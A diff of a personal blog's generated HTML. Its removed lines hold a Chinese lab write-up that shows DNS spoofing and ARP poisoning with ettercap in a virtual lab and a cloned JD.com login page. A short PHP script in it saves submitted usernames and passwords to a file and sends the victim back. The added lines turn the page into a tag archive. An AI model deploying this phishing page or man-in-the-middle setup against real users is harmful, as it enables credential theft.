@@ -6,29 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
-  <title>diaoyu | 一路走到黑</title>
+  <title>Tag: https://www.bilibili.com/video/BV1qJ411S7F6 | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
-<meta property="og:type" content="article">
-<meta property="og:title" content="diaoyu">
-<meta property="og:url" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="一路走到黑">
+<meta property="og:url" content="https://sunzhengyu99.github.io/tags/https-www-bilibili-com-video-BV1qJ411S7F6/index.html">
 <meta property="og:site_name" content="一路走到黑">
-<meta property="og:description" content="DNS欺骗、ARP攻击及钓鱼网站制作">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/tuopu.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/1.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/2.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/3.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/4.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/5.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/6.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/7.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/8.png">
-<meta property="article:published_time" content="2020-07-18T09:37:15.000Z">
-<meta property="article:modified_time" content="2020-07-18T09:53:22.634Z">
 <meta property="article:author" content="sunzy">
-<meta property="article:tag" content="sunzy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/07/18/diaoyu/tuopu.png">
   
     <link rel="alternative" href="/atom.xml" title="一路走到黑" type="application/atom+xml">
   
@@ -160,204 +145,61 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-diaoyu" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      diaoyu
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2020" class="archive-year">2020</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2020/07/18/%E7%88%AC%E5%9B%BE/" class="archive-article-date">
+  	<time datetime="2020-07-18T09:40:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-18</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2020/07/18/%E7%88%AC%E5%9B%BE/">爬图</a>
     </h1>
   
 
-        
-        <a href="/2020/07/18/diaoyu/" class="archive-article-date">
-  	<time datetime="2020-07-18T09:37:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
-<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$nam = stripslashes($_POST[<span class="string">'name'</span>]); <span class="comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span></span><br><span class="line">$pas = stripslashes($_POST[<span class="string">'pass'</span>]);<span class="comment">//pass也一样</span></span><br><span class="line">$content = <span class="string">"您已捕获京东账号及密码1个："</span> . <span class="string">" 用户名 "</span> . $nam . <span class="string">" 密码 "</span> . $pas;   <span class="comment">//保存捕获的用户名和密码</span></span><br><span class="line">$filed = @fopen(<span class="string">"1.txt"</span>, <span class="string">"a+"</span>);   <span class="comment">//打开1.txt</span></span><br><span class="line">@fwrite($filed, <span class="string">"$content\n"</span>);     <span class="comment">//将用户名和密码写入1.txt</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">goBack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			window.history.back() <span class="comment">//后退+刷新</span></span><br><span class="line">		&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
-<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p>
-<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
-<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" alt></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sunzy</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">https://www.bilibili.com/video/BV1qJ411S7F6</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/07/18/diaoyu/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2020/07/18/%E7%88%AC%E5%9B%BE/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          爬图
-        
-      </div>
-    </a>
   
   
-    <a href="/2020/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">php反序列化</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
- 
-  <!-- 来必力City版安装代码 -->
-<div id="lv-container" data-id="city" data-uid="MTAyMC80OTI1Ni8yNTc1MA==">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
-</div>
-<!-- City版安装代码已完成 -->
+    </div></section>
   
 
-  
-  
-  
+    
 
-  
-
-  
-
-  
 
 
           </div>
@@ -382,9 +224,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
